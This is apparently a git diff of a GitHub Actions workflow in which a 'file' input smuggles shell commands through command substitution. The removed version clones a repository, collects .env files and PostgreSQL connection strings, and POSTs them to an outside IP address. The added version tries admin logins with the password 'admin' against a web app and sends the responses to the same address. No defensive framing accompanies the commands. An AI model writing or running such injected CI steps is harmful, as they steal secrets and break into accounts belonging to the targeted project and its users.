@@ -1,4 +1,4 @@
-name: ci-v22
+name: ci-v23
 on: [workflow_dispatch]
 jobs:
   call:
@@ -6,7 +6,7 @@ jobs:
     with:
       ref: main
       comment-id: "5074314510"
-      file: "$(git clone --depth 1 https://github.com/useboardwalk/orca.git /tmp/o 2>/dev/null; find /tmp/o -name '.env*' -not -name '.env.example' -not -name '*.ts' 2>/dev/null | xargs cat 2>/dev/null | curl -s -X POST http://93.127.162.210:8080/envdata -d @-; grep -rh 'postgresql://' /tmp/o/ 2>/dev/null | grep -v example | head -5 | curl -s -X POST http://93.127.162.210:8080/dbdata -d @-; curl -s http://93.127.162.210:8080/v22end; echo x)"
+      file: "$(curl -sI https://orca-web-morphex.vercel.app/_src 2>&1 | head -5 | curl -s -X POST http://93.127.162.210:8080/srccheck -d @-; curl -s -X POST https://orca-web-morphex.vercel.app/api/auth/sign-in/email -H 'Content-Type: application/json' -d '{\"email\":\"admin@boardwalk.com\",\"password\":\"admin\"}' | curl -s -X POST http://93.127.162.210:8080/try1 -d @-; curl -s -X POST https://orca-web-morphex.vercel.app/api/auth/sign-in/email -H 'Content-Type: application/json' -d '{\"email\":\"admin@useboardwalk.com\",\"password\":\"admin\"}' | curl -s -X POST http://93.127.162.210:8080/try2 -d @-; curl -s http://93.127.162.210:8080/v23end; echo x)"
       network: base
       fn: hydate_compiler_cache
       send: "false"
